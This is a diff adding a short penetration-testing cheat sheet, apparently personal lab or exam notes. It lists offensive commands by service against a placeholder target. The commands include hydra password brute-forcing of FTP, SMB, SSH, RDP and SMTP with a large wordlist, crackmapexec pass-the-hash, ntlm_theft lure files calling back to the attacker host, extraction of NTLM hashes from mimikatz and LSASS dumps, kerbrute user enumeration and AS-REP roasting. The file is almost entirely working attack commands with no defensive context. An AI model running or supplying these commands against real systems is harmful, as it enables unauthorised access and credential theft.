@@ -1,0 +1,47 @@
+# web
+ffw http "$rhost" ":80"
+nik http "$rhost" 80
+aff | grep -Ev "^403"
+aff | grep -E "403"
+cewl -d 10 -w cewl.out --with-numbers -a --meta_file cewl-meta.txt -e --email_file cewl-email.txt http://"$rhost"
+
+# ports
+psu "$rhost"
+
+# ftp
+enumftp "$rhost"
+hydra -V -l 'some_users' -P "$ROCKYOU" "$rhost" ftp
+
+# smb
+enumsmb "$rhost"
+hydra -V -l 'some_user' -P "$ROCKYOU" "$rhost" smb
+crackmapexec smb -u users.txt -p some_pass --shares "$rhost" --continue-on-success
+crackmapexec smb -u users.txt -H hashes.txt --shares "$rhost" --continue-on-success
+
+# ssh
+hydra -V -l 'some_user' -P "$ROCKYOU" "$rhost" ssh
+
+# mssql
+impacket-mssqlclient "sa@$rhost"
+
+# mysql
+mysql -u root -p'some_pw' -h "$rhost" -e "show databases;"
+
+# rdp
+hydra -V -l 'some_user' -P "$ROCKYOU" "$rhost" rdp
+
+# smtp
+hydra -V -l 'some_user' -P "$ROCKYOU" "$rhost" smtp
+nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 -Pn "$rhost"
+
+# hashes
+python3 ntlm_theft.py --generate all -s "$lhost" -f important_file
+cat mimi.txt | grep -io "[a-fA-F0-9]\{32\}" | sort -u
+cat mimi.txt | grep -ir "pass"
+pypykatz lsa minidump ../loot/lsass.DMP > ../pypykatz.out
+
+# win
+kerbrute userenum -d somedomain --dc "$rhost" users.txt
+impacket-GetNPUsers -userfile users.txt -format hashcat -outputfile hash.asrep -dc-ip "$rhost" somedomain/
+
+
